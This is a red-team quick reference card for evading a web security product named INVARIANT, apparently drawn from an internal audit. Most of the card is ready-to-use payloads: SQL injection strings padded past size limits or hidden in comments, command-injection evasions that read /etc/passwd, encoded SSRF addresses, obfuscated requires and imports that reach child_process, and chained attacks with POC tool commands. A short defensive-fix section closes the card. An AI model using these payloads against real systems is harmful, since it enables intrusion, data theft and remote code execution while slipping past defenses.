# INVARIANT Red Team — Quick Reference Card

## 🎯 Critical Bypass Vectors (Immediate Exploitation)

### 1. Static Asset Query String Bypass
```
GET /style.css?user=' UNION SELECT * FROM passwords-- HTTP/1.1
GET /api/users.css?action=delete&id=1 HTTP/1.1
```
**File:** `packages/edge-sensor/src/index.ts:883-887`
**Why it works:** Query strings are NOT analyzed for static asset requests.

---

### 2. Body Size Limit Bypass
```python
# Send 33KB+ with payload at the end
payload = "A" * 32750 + "' OR 1=1--"
```
**File:** `packages/edge-sensor/src/modules/body-analysis.ts:51`
**Why it works:** Bodies >32KB are skipped entirely.

---

### 3. SQL Comment Injection
```sql
' OR 1=1 /*AAAAAAAA...(4090 As)...*/union select * from users--
```
**File:** `packages/engine/src/evaluators/sql-expression-evaluator.ts:109-117`
**Why it works:** Block comments are skipped without content validation.

---

### 4. Input Length Truncation
```python
# Push malicious pattern beyond 4096 char boundary
payload = "A" * 4080 + "' OR 1=1--"
```
**File:** `packages/engine/src/evaluators/sql-expression-evaluator.ts:88-89`
**Why it works:** MAX_INPUT = 4096 truncation before detection.

---

## 🔥 High Severity Bypass Vectors

### 5. RASP Code Pattern Bypass
```javascript
// String concatenation
const cp = require('ch' + 'ild_process')

// Indirect require
const req = require
const fs = req('f' + 's')

// fromCharCode
const evil = eval(String.fromCharCode(114,101,113,117,105,114,101))
```
**File:** `packages/agent/src/rasp/exec.ts:53-60`
**Why it works:** Regex patterns don't catch string manipulation.

---

### 6. Command Injection Evasion
```bash
# $IFS instead of space
;cat${IFS}/etc/passwd

# Path globbing
/???/b??h -c "whoami"

# Newline separator
cat
/etc/passwd
```
**File:** `packages/agent/src/rasp/exec.ts:33`
**Why it works:** Regex `/[;&|`\$]\s*.../` doesn't cover all separators.

---

### 7. SSRF IP Encoding Bypass
```
http://0177.0.0.1/          # Octal - NOT detected
http://127.1/               # Short form - NOT detected
http://[0:0:0:0:0:0:0:1]/   # Full IPv6 - NOT detected
http://[::ffff:127.0.0.1]/  # IPv6 mapped - NOT detected
```
**File:** `packages/engine/src/classes/ssrf/index.ts:42`
**Why it works:** Regex doesn't cover all IP canonicalization schemes.

---

### 8. WebSocket Binary Frame Bypass
```javascript
// Send CBOR-encoded payload
const binary = cbor.encode({query: "' UNION SELECT * FROM passwords--"})
websocket.send(binary)
```
**File:** `packages/edge-sensor/src/index.ts`
**Why it works:** Only string frames are analyzed; binary passes through.

---

### 9. Multipart File Upload Bypass
```
Content-Type: text/plain; filename=shell.php
```
**File:** `packages/edge-sensor/src/modules/body-analysis.ts:315-339`
**Why it works:** Check only looks for "text/plain" substring, ignores filename.

---

## 📊 Confidence Score Manipulation

### L1-Only Detection (0.70 confidence)
If payload triggers L1 regex but breaks L2 tokenization:
- L1-only confidence: **0.70**
- Convergent (L1+L2): **0.97**

**Goal:** Craft payload that triggers L1 but causes L2 to fail.

---

## 🔗 Exploitation Chains

### Chain 1: Complete Edge Bypass
```
Target: POST /api/v1/users
Vector: GET /api/v1/users.css?action=delete&id=1
Result: Query string NEVER analyzed
```

### Chain 2: SQLi via Body + Comment
```python
body = {
    "data": "A" * 32700 + "' OR 1=1 /*" + "B" * 4050 + "*/union select * from admin--"
}
# Body >32KB: Skipped
# SQL: Truncation + comment injection
```

### Chain 3: RCE via RASP Evasion
```javascript
// Frozen intrinsics (Node 20+) disables hooks
// Use dynamic import + string obfuscation
const cp = await import('child_' + 'process')
cp['ex' + 'ec']('cat /etc/passwd')
```

---

## 📁 File Locations

| Component | File | Purpose |
|-----------|------|---------|
| Engine | `packages/engine/src/invariant-engine.ts` | Detection orchestration |
| Engine | `packages/engine/src/evaluators/sql-expression-evaluator.ts` | L2 SQL detection |
| Engine | `packages/engine/src/classes/ssrf/index.ts` | SSRF patterns |
| Edge | `packages/edge-sensor/src/index.ts` | 14-layer pipeline |
| Edge | `packages/edge-sensor/src/modules/body-analysis.ts` | Body parsing |
| RASP | `packages/agent/src/rasp/sql.ts` | SQL driver hooks |
| RASP | `packages/agent/src/rasp/exec.ts` | Command/code injection hooks |

---

## 🔧 POC Tool Usage

```bash
# SQL injection bypass via comment
python pocs/invariant_bypass_poc.py -t https://target.com -v sqli-comment

# Length truncation attack
python pocs/invariant_bypass_poc.py -t https://target.com -v sqli-truncation

# Static asset bypass
python pocs/invariant_bypass_poc.py -t https://target.com -v static-asset -e /api/users

# SSRF IP encoding
python pocs/invariant_bypass_poc.py -t https://target.com -v ssrf-ip

# Command injection evasion
python pocs/invariant_bypass_poc.py -t https://target.com -v cmdi -c whoami
```

---

## ⚠️ Detection Indicators

Blocked requests may include headers:
```
X-Invariant-Action: block
X-Invariant-Classification: sql_string_termination
X-Invariant-Confidence: 0.97
```

If you DON'T see these headers, the bypass likely succeeded.

---

## 🛡️ Defensive Recommendations

### Immediate (24-48 hours)
1. **Fix body size bypass:** Analyze truncated bodies OR block oversized requests
2. **Fix static asset bypass:** Analyze query strings regardless of extension
3. **Add MAX_INPUT enforcement:** Reject >4096 char inputs in enforce mode
4. **Patch comment skipping:** Validate comment contents for SQL keywords

### Short-term (1-2 weeks)
1. Implement VM hook detection using AST parsing instead of regex
2. Add comprehensive IP canonicalization for SSRF
3. Add binary WebSocket frame analysis
4. Implement frozen intrinsics detection with fallback

### Long-term (1 month+)
1. Add LRU eviction to pattern cache
2. Implement distributed chain correlation
3. Add ML-based anomaly detection
4. Audit closed-source Rust/WASM layer

---

**Last Updated:** 2026-03-09  
**Classification:** RED TEAM / AUTHORIZED TESTING ONLY
